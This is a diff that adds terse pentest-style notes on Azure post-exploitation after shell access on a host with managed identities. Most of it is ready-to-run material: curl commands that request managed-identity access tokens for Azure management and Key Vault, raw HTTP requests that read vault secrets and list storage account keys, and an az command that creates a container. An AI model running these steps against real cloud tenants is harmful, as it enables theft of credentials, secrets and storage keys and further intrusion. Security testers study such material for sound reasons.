@@ -1,0 +1,45 @@
+After getting shell access where managed identites are on
+
+1. getting the access_token  
+Linux-> curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2019-08-01" -H X-IDENTITY-HEADER:$IDENTITY_HEADER
+windows-> curl  "%IDENTITY_ENDPOINT%?resource=https://management.azure.com&api-version=2019-08-01" -H X-IDENTITY-HEADER:%IDENTITY_HEADER% -X GET -o access_token.txt
+
+
+
+2. key vaults
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" -H X-IDENTITY-HEADER:$IDENTITY_HEADER
+
+GET /secrets/?api-version=2016-10-01 HTTP/1.1
+Host: usersekey.vault.azure.net
+Authorization: Bearer eyJ0eX....
+
+
+3. Storage accounts
+Need a connection string, it can be found in windows but not in linux(env_variable)
+There is a High possiblity to get from application config files(both linux and windows)
+https://docs.microsoft.com/en-us/rest/api/storagerp/storageaccounts/listkeys
+
+POST /subscriptions/57cca559-1315-4eed-87cc-337c5c01078c/resourcegroups/trouble1/providers/Microsoft.Storage/storageAccounts/trouble1storageaccount/listKeys?api-version=2019-06-01&$expand=kerb HTTP/1.1
+Host: management.azure.com
+Authorization: Bearer eyJ0eXAiOiJKV1QiL
+
+
+
+
+
+
+
+az container create -g trouble1 --name trouble1containera --image microsoft/iis:nanoserver --cpu 1 --memory 1 --os-type Windows
+
+
+
+
+
+
+
+
+
+
+
+
+
